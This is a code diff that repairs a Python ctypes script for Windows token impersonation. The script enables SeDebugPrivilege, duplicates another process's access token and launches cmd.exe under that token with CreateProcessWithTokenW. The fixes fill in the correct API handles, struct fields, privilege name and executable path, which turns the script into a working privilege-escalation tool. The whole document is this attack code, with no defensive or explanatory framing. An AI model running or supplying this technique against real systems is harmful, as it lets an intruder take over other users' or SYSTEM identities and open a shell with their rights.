@@ -100,8 +100,8 @@ class STARTUPINFOA(ctypes.Structure):
         ('dwYCountChars', DWORD),
         ('dwFillAttribute', DWORD),
         ('dwFlags', DWORD),
-        (' wShowWindow', WORD),
-        (' cbReserved2', WORD),
+        ('wShowWindow', WORD),
+        ('cbReserved2', WORD),
         ('lpReserved2', LPBYTE),
         ('hStdInput', HANDLE),
         ('hStdOutput', HANDLE),
@@ -265,7 +265,7 @@ def adjust_token_privilege(requiredPrivileges, TokenHandle, a_handle, k_handle):
         print("[ERROR] AdjustTokenPrivileges Failed! Error Code: {0}".format(k_handle.GetLastError()))
 
 
-def duplicate_token_ex(target_token_handle, k_handle):
+def duplicate_token_ex(target_token_handle, a_handle, k_handle):
     # now we duplicate the target process token
     hExistingToken = target_token_handle
     dwDesiredAccess = TOKEN_ALL_ACCESS
@@ -280,7 +280,7 @@ def duplicate_token_ex(target_token_handle, k_handle):
     lpTokenAttributes.nLength = ctypes.sizeof(lpTokenAttributes)  # set the right size of itself
 
     # Calls DuplicateTokenEx
-    response = k_handle.DuplicateTokenEX(
+    response = a_handle.DuplicateTokenEx(
         hExistingToken,
         dwDesiredAccess,
         ctypes.byref(lpTokenAttributes),
@@ -297,10 +297,10 @@ def duplicate_token_ex(target_token_handle, k_handle):
     return phNewToken
 
 
-def create_process_with_token_w(hToken, k_handle):
+def create_process_with_token_w(hToken, a_handle, k_handle):
     # hToken given
     dwLogonFlags = 0x00000001  # corresponds to LOGON_WITH_PROFILE, instead of using the network
-    lpApplicationName = "C:\System32\cmd.exe"
+    lpApplicationName = "C:\Windows\System32\cmd.exe"
     lpCommandLine = None  # not using any command-line arguments
     dwCreationFlags = 0x00000010  # CREATE_NEW_CONSOLE (i.e., spawn separate window)
     lpEnvironment = None  # use the impersonated user's environment instead
@@ -311,10 +311,11 @@ def create_process_with_token_w(hToken, k_handle):
     # set the attributes for the new window
     lpStartupInfo.wShowWindow = 0x1  # 0x1 == show normal size, 0x3 == maximize
     lpStartupInfo.dwFlags = 0x1  # have to set this flag for the API to check the wShowWindow setting
+    lpStartupInfo.cb = ctypes.sizeof(lpStartupInfo)  # set the right size of itself
 
     # CreateProcessWithTokenW
-    response = k_handle.CreateProcessWithTokenW(
-        ctypes.byref(hToken),
+    response = a_handle.CreateProcessWithTokenW(
+        hToken,
         dwLogonFlags,
         lpApplicationName,
         lpCommandLine,
@@ -375,11 +376,11 @@ def main():
     # impersonated process
     my_process_id = os.getpid()
     my_token_handle = my_get_proces_token_by_id(my_process_id, k_handle)
-    toggle_privilege('SEDebugPrivlege', my_token_handle, a_handle, k_handle)
+    toggle_privilege('SEDebugPrivilege', my_token_handle, a_handle, k_handle)
 
-    hToken = duplicate_token_ex(target_token_handle, k_handle)
+    hToken = duplicate_token_ex(target_token_handle, a_handle, k_handle)
 
-    new_process = create_process_with_token_w(hToken, k_handle)
+    new_process = create_process_with_token_w(hToken, a_handle, k_handle)
 
     print('New process ID: {0}'.format(new_process.dwProcessId))
 
